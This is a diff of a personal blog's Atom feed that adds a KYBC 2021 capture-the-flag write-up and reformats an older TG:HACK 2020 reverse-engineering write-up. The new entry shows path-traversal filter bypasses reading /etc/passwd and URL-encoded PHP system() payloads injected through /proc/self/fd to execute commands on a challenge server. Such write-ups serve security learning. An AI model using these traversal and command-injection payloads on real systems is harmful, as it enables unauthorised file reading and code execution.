@@ -1,14 +1,50 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Railslide - CTF</title><link href="https://railslide.io/" rel="alternate"></link><link href="https://railslide.io/feeds/ctf.atom.xml" rel="self"></link><id>https://railslide.io/</id><updated>2020-04-18T00:00:00+02:00</updated><entry><title>TG:HACK 2020 Writeup - A game of keys</title><link href="https://railslide.io/tghack-2020-writeup-a-game-of-keys.html" rel="alternate"></link><published>2020-04-18T00:00:00+02:00</published><updated>2020-04-18T00:00:00+02:00</updated><author><name>Giulia Vergottini</name></author><id>tag:railslide.io,2020-04-18:/tghack-2020-writeup-a-game-of-keys.html</id><summary type="html">&lt;p&gt;During Easter I played the TG:HACK 2020 CTF. Here' is my writeup for the &lt;em&gt;A game of keys&lt;/em&gt; challenge.&lt;/p&gt;</summary><content type="html">&lt;blockquote&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Railslide - CTF</title><link href="https://railslide.io/" rel="alternate"></link><link href="https://railslide.io/feeds/ctf.atom.xml" rel="self"></link><id>https://railslide.io/</id><updated>2021-03-17T00:00:00+01:00</updated><entry><title>KYBC 2021 - Maze 1 Writeup</title><link href="https://railslide.io/kybc-yogosha-2021-writeups.html" rel="alternate"></link><published>2021-03-17T00:00:00+01:00</published><updated>2021-03-17T00:00:00+01:00</updated><author><name>Giulia Vergottini</name></author><id>tag:railslide.io,2021-03-17:/kybc-yogosha-2021-writeups.html</id><summary type="html">&lt;p&gt;My writeup for Maze 1 challenge at KYBC CTF&lt;/p&gt;</summary><content type="html">&lt;p&gt;The site is basically a search box that checks for matching txt files and then redirects to &lt;code&gt;http://5.150.254.85:8082/lookup.php?f=file.txt&lt;/code&gt; to display the content of the file. &lt;code&gt;flag.txt&lt;/code&gt; obviously leads to a fake flag, but the whole thing looks like a potential LFI.&lt;/p&gt;
+&lt;p&gt;Trying to reach a file with an extension other than &lt;code&gt;.txt&lt;/code&gt; results in an error. However, appending an extra &lt;code&gt;f&lt;/code&gt; parameters after one with the &lt;code&gt;.txt&lt;/code&gt; extension lets me bypass the extension check and access the content of the last file.&lt;/p&gt;
+&lt;p&gt;The txt files are inside a &lt;code&gt;files/&lt;/code&gt; folder and there seem to be some sort of sanitization mechanism, since &lt;code&gt;../&lt;/code&gt; get stripped away. However, the filter applies only to that specific pattern, so &lt;code&gt;....//&lt;/code&gt; becomes &lt;code&gt;../&lt;/code&gt; after sanitation and allows me to look up into the parent folder.&lt;/p&gt;
+&lt;p&gt;Combining the two bypasses together gets me the &lt;code&gt;etc/passwd&lt;/code&gt; file:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;http://5.150.254.85:8082/lookup.php?f=flag.txt&amp;amp;f=....//....//....//....//etc/passwd`&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The flag doesn't seem to be there though.&lt;/p&gt;
+&lt;p&gt;Let's see if it is possible to turn this LFI into an RCE, since trying to guess name and location of the flag doesn't sound like a realistic strategy.&lt;/p&gt;
+&lt;p&gt;By examining the &lt;code&gt;proc/self/fd&lt;/code&gt; folder I discover that &lt;code&gt;proc/self/fd/11&lt;/code&gt; stores the serialized parameters of the search request. Let's see if we can write by making a POST request containing &lt;code&gt;&amp;lt;?php system('id'); ?&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;http://5.150.254.85:8082/search=%3C%3Fphp+system%28%27id%27%29%3B+%3F%3E&amp;amp;submit=submit&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;and check the proc file again&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;http://5.150.254.85:8082/lookup.php?f=flag.txt&amp;amp;f=....//....//....//....//proc/self/fd/11&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Yeah! The code gets executed and the result gets saved into it!!&lt;/p&gt;
+&lt;p&gt;Let's run &lt;code&gt;ls /&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;http://5.150.254.85:8082/search=%3C%3Fphp%20system%28%27ls%20-al%27%29%3B%20%3F%3E&amp;amp;submit=submit&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;No flag in the root folder, but &lt;code&gt;home/ctf_user1&lt;/code&gt; seems interesting:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;http://5.150.254.85:8082/search=%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%6c%73%20%2d%61%6c%20%2f%68%6f%6d%65%2f%63%74%66%5f%75%73%65%72%31%27%29%3b%20%3f%3e&amp;amp;submit=submit&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;there's the flag - let's cat it!&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;http://5.150.254.85:8082/search=%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%63%61%74%20%2f%68%6f%6d%65%2f%63%74%66%5f%75%73%65%72%31%2f%2e%33%33%36%64%35%65%62%63%35%34%33%36%35%33%34%65%36%31%64%31%36%65%36%33%64%64%66%63%61%33%32%37%5f%66%6c%61%67%31%2e%74%78%74%27%29%3b%20%3f%3e&amp;amp;submit=submit&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Success! &lt;code&gt;FLAG_c4a66ead822b8d2dd42da826eb180371&lt;/code&gt;&lt;/p&gt;</content><category term="CTF"></category><category term="ctf"></category><category term="lfi"></category><category term="rce"></category><category term="kybc"></category></entry><entry><title>TG:HACK 2020 Writeup - A game of keys</title><link href="https://railslide.io/tghack-2020-writeup-a-game-of-keys.html" rel="alternate"></link><published>2020-04-18T00:00:00+02:00</published><updated>2020-04-18T00:00:00+02:00</updated><author><name>Giulia Vergottini</name></author><id>tag:railslide.io,2020-04-18:/tghack-2020-writeup-a-game-of-keys.html</id><summary type="html">&lt;p&gt;During Easter I played the TG:HACK 2020 CTF. Here' is my writeup for the &lt;em&gt;A game of keys&lt;/em&gt; challenge.&lt;/p&gt;</summary><content type="html">&lt;blockquote&gt;
 &lt;p&gt;Download this file and get the flag. You will also need this wordlist.&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;The provided files are a python compiled file (keygame.pyc) and a txt file with a list of gibberish words (wordlist.txt). The wordlist didn't seem very interesting, so I proceeded to decompile the python file&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ uncompyle6 keygame.pyc &amp;gt; keygame.py
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ uncompyle6 keygame.pyc &amp;gt; keygame.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;And had a look at the source code&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;
 &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;itertools&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;cycle&lt;/span&gt;
 
 &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;myGame&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
@@ -59,12 +95,12 @@
     &lt;span class="n"&gt;y1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;input a number: &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
     &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mgame&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;make_keys&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
     &lt;span class="n"&gt;mgame&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;checkdata&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;My take from it was that the programs takes four inputs and uses them for creating a key based on a matrix and on the wordlist. If the resulting key is the correct one, the &lt;code&gt;checkdata&lt;/code&gt; function is going to print out the flag.&lt;/p&gt;
 &lt;p&gt;Running the program confirmed my theory&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python keygame.py
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ python keygame.py
 input a number: &lt;span class="m"&gt;1&lt;/span&gt;
 input a number: &lt;span class="m"&gt;1&lt;/span&gt;
 input a number: &lt;span class="m"&gt;1&lt;/span&gt;
@@ -73,12 +109,12 @@ aa0caa0c
 &lt;span class="m"&gt;5&lt;/span&gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;RYAW   DASA_BYF
                            ^
                              ^ &lt;span class="nv"&gt;aa0caa0c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; TG31&lt;span class="o"&gt;{&lt;/span&gt;tils gmag!vhotmd c&lt;span class="sb"&gt;`&lt;/span&gt; oo!tei%mono&lt;span class="o"&gt;}&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Now, how to figure out what are the correct inputs? The sources shows that the game is created with a 25x25 matrix (&lt;code&gt;mgame = myGame(25, 25)&lt;/code&gt;) and since the inputs are used as indexes for the matrix, any input greater than 24 should be invalid.&lt;/p&gt;
 &lt;p&gt;A quick run of the program confirmed this theory as well&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python keygame.py
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ python keygame.py
 input a number: &lt;span class="m"&gt;25&lt;/span&gt;
 input a number: &lt;span class="m"&gt;25&lt;/span&gt;
 input a number: &lt;span class="m"&gt;25&lt;/span&gt;
@@ -89,11 +125,11 @@ Traceback &lt;span class="o"&gt;(&lt;/span&gt;most recent call last&lt;span clas
   File &lt;span class="s2"&gt;&amp;quot;keygame.py&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;34&lt;/span&gt;, in make_keys
     keyArray.append&lt;span class="o"&gt;(&lt;/span&gt;self.matrix&lt;span class="o"&gt;[&lt;/span&gt;args&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;]][&lt;/span&gt;args&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]])&lt;/span&gt;
 IndexError: list index out of range
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;So, I needed a way to test all the possible combinations of four inputs ranging from 0 to 24 and it turned out that python has a built-in way for doing just that. Enter &lt;code&gt;itertools.products&lt;/code&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;itertools&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;itertools&lt;/span&gt;
 &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;keygame&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;myGame&lt;/span&gt;
 
 &lt;span class="n"&gt;inputs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
@@ -106,9 +142,9 @@ IndexError: list index out of range
     &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mgame&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;checkdata&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
     &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;startswith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;TG20{&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
         &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;I commented out the &lt;code&gt;print&lt;/code&gt; statements from keygame.py to reduce the noise, and then waited for my script to spit out the flag&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;TG20{this flag should be on teh moon}&amp;#39;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;</content><category term="CTF"></category><category term="ctf"></category><category term="reverse"></category></entry></feed>
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="s1"&gt;&amp;#39;TG20{this flag should be on teh moon}&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="CTF"></category><category term="ctf"></category><category term="reverse"></category></entry></feed>
